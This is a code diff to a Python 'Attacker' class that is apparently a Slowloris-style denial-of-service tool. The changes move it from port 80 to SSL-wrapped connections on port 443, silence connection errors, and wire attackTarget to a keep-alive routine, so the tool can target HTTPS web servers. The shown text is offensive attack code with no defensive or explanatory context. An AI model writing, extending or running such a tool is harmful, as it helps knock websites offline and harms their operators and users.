@@ -5,7 +5,7 @@ import ssl
 class Attacker:
     def __init__(self, target):
         self.target = target
-        self.port = 80
+        self.port = 443
         self.loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.status = "Unconnected"
 
@@ -33,14 +33,15 @@ class Attacker:
     #This method creates the sockets that will be used in the attack
     def createSocket(self):
 
-        #This needs to be changed to enable HTTPS connections, this implementation is currently
-        #loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        self.loris = ssl.wrap_socket(self.loris, ssl_version=ssl.PROTOCOL_SSLv23)
+        try:
+            self.loris = ssl.wrap_socket(self.loris, ssl_version=ssl.PROTOCOL_SSLv23)
 
-        self.loris.connect((self.target, 443))
+            self.loris.connect((self.target, self.port))
 
-        self.status = "Connected to "+self.target+" Target on port 443"
+            self.status = "Connected to " + self.target + " Target on port 443"
+        except Exception as exception:
+            pass
 
 
 
@@ -62,9 +63,9 @@ class Attacker:
     #Method that starts the attack on the target
     def attackTarget(self):
         try:
-            pass
+            self.stayAlive()
         except Exception as e:
-            print(e)
+            pass
 
         self.status = "Attacking "+self.target+""
 
